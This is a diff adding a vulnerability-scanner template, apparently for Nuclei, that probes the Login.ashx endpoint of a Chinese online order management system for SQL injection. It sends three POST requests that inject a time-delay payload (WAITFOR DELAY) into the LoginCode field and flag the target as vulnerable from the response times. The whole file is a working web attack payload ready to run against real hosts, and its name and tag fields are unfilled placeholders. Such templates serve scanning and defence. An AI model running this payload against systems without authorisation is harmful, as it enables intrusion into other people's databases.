@@ -1,0 +1,51 @@
+id: TUTORSOFT-ERP-login-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 杜特网上订单管理系统Login.ashx存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /ajax/Login.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 60
+
+        LoginCode=1';WAITFOR+DELAY+'0:0:3'--&Password=1&ckRemember=0
+      - |-
+        POST /ajax/Login.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 60
+
+        LoginCode=1';WAITFOR+DELAY+'0:0:6'--&Password=1&ckRemember=0
+      - |-
+        POST /ajax/Login.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 60
+
+        LoginCode=1';WAITFOR+DELAY+'0:0:9'--&Password=1&ckRemember=0
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
